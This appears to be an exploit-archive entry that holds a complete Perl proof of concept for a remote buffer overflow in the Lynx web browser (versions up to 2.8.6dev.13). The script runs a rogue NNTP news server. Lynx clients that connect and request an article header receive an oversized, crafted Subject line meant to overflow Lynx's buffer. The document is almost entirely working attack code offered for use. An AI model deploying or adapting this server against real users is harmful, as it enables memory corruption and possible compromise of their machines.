Lynx <= 2.8.6dev.13 Remote Buffer Overflow Exploit (PoC)
========================================================



#!/usr/bin/perl --

# lynx-nntp-server
# by Ulf Harnhammar in 2005
# I hereby place this program in the public domain.

use strict;
use IO::Socket;

$main::port = 119;
$main::timeout = 5;

# *** SUBROUTINES ***

sub mysend($$)
{
my $file = shift;
my $str = shift;

print $file "$str\n";
print "SENT: $str\n";
} # sub mysend

sub myreceive($)
{
my $file = shift;
my $inp;

eval
{
local $SIG{ALRM} = sub { die "alarm\n" };
alarm $main::timeout;
$inp = <$file>;
alarm 0;
};

if ($@ eq "alarm\n") { $inp = &#039;&#039;; print "TIMED OUT\n"; }
$inp =~ tr/\015\012\000//d;
print "RECEIVED: $inp\n";
$inp;
} # sub myreceive

# *** MAIN PROGRAM ***

{
my $server = IO::Socket::INET->new( Proto => &#039;tcp&#039;,
LocalPort => $main::port,
Listen => SOMAXCONN,
Reuse => 1);
die "can&#039;t set up server!\n" unless $server;


while (my $client = $server->accept())
{
$client->autoflush(1);
print &#039;connection from &#039;.$client->peerhost."\n";


mysend($client, &#039;200 Internet News&#039;);
my $group = &#039;alt.angst&#039;;

while (my $str = myreceive($client))
{
if ($str =~ m/^mode reader$/i)
{
mysend($client, &#039;200 Internet News&#039;);
next;
}

if ($str =~ m/^group ([-_.a-zA-Z0-9]+)$/i)
{
$group = $1;
mysend($client, "211 1 1 1 $group");
next;
}

if ($str =~ m/^quit$/i)
{
mysend($client, &#039;205 Goodbye&#039;);
last;
}

if ($str =~ m/^head ([0-9]+)$/i)
{
my $evil = &#039;$@UU(JUU&#039; x 21; # Edit the number!
$evil .= &#039;U&#039; x (504 - length $evil);

my $head = <<HERE;
221 $1 <xyzzy\@usenet.qx>
Path: host!someotherhost!onemorehost
From: <mr_talkative\@usenet.qx>
Subject: $evil
Newsgroup: $group
Message-ID: <xyzzy\@usenet.qx>
.
HERE

$head =~ s|\s+$||s;
mysend($client, $head);
next;
}

mysend($client, &#039;500 Syntax Error&#039;);
} # while str=myreceive(client)

close $client;
print "closed\n\n\n";
} # while client=server->accept()
}



